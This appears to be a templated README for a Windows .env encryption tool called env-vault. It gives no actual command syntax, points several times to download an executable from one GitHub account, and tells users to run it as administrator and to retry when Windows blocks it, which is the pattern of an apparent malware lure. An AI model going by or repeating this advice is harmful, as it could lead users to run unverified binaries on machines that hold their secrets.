# 🔐 env-vault - Lock and unlock .env files fast

[![Download env-vault](https://img.shields.io/badge/Download-Env--Vault-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Undercarriagesayso250/env-vault)

## 🛡️ What env-vault does

env-vault helps you protect your `.env` files with simple encryption. It uses AES-256 and can work with AWS KMS when you need cloud key support. You can lock and unlock secrets with one command, and you do not need to set up extra servers.

Use it to keep things like API keys, database passwords, and app tokens out of plain sight while you work on Windows.

## 📦 Download

Visit this page to download:
https://github.com/Undercarriagesayso250/env-vault

If the page shows a release file, download it to your PC. If it shows source files, use the download option on the page and open the folder after it finishes.

## 💻 What you need

- Windows 10 or Windows 11
- A `.env` file you want to protect
- Permission to open and save files on your PC
- An internet connection for the first download
- AWS access only if you plan to use KMS

## 🚀 Install and run on Windows

1. Open the download page:
   https://github.com/Undercarriagesayso250/env-vault

2. Look for the latest release or download option.

3. Download the Windows file or the ZIP file to your computer.

4. If you downloaded a ZIP file, right-click it and choose Extract All.

5. Open the extracted folder.

6. Find the env-vault app file or command file in the folder.

7. Double-click the file to start it.

8. If Windows asks for permission, choose Yes.

9. Keep the app in a folder where you can find your `.env` file.

## 🔑 How to use it

env-vault is made for simple secret handling. A normal flow looks like this:

1. Put your `.env` file in the same folder as env-vault, or note its file path.
2. Choose the lock command to encrypt the file.
3. Save or enter your key when asked.
4. Store the locked file in a safe place.
5. Use the unlock command when you need the plain text file again.

### Example use

- Lock your secrets before sharing code
- Unlock them only when you need to run the app
- Lock them again after you finish

## 🧭 Common tasks

### 🔒 Lock a .env file

Use this when your file has passwords, tokens, or private app settings.

- Select the `.env` file
- Choose a password or key
- Save the encrypted version

### 🔓 Unlock a .env file

Use this when you need to read or edit the secrets.

- Select the locked file
- Enter the same key used to lock it
- Save the unlocked file to a safe path

### ☁️ Use AWS KMS

If your team uses AWS, env-vault can work with KMS for key control.

- Connect your AWS account
- Choose your KMS key
- Lock and unlock files with cloud-backed keys

## 🗂️ Files you may see

- `.env` — your normal secrets file
- `.env.locked` — encrypted file output
- `config.json` — saved settings, if included
- `README.md` — this guide

## 🔐 Security basics

env-vault uses AES-256 encryption to protect file contents. That means the file is turned into unreadable text until you unlock it with the right key.

A good setup is:

- Use a strong password or key
- Keep locked files in your project folder or a private folder
- Do not send unlocked `.env` files by email
- Store AWS KMS settings only if you need cloud control

## 🛠️ If something does not work

### The app does not open

- Check that the file finished downloading
- Move the file to a normal folder like Downloads or Desktop
- Right-click the file and choose Run as administrator if needed

### Windows blocks the file

- Check the file came from the GitHub page
- Try extracting the ZIP file first
- Try opening it again from the extracted folder

### Your `.env` file is not found

- Make sure the file name is exactly `.env`
- Check that the file is in the folder you selected
- Use the full file path if the app asks for one

### Unlock does not work

- Check that you used the same key
- Make sure the locked file was not changed
- Try again with the correct file and path

## 🧰 Best ways to use env-vault

- Keep one locked file for each app
- Use clear file names for test and production files
- Lock secrets before you share code with others
- Unlock only when you need to run or edit the app
- Store backup copies in a private place

## 📚 Terms in plain English

- **Secret**: private data like passwords or tokens
- **Encrypt**: turn readable text into locked text
- **Decrypt**: turn locked text back into readable text
- **KMS**: a cloud tool for managing keys in AWS
- **AES-256**: a strong encryption method

## 🖥️ Typical Windows setup

A simple folder setup can look like this:

- `Downloads\env-vault\`
- `Downloads\env-vault\.env`
- `Downloads\env-vault\.env.locked`

This keeps the app and your files together so they are easy to find.

## 📌 Why people use it

- It keeps `.env` files private
- It reduces manual work
- It fits small projects and larger teams
- It works without extra servers
- It gives you a simple way to control secrets on Windows

## 🔗 Download again

[Download env-vault from GitHub](https://github.com/Undercarriagesayso250/env-vault)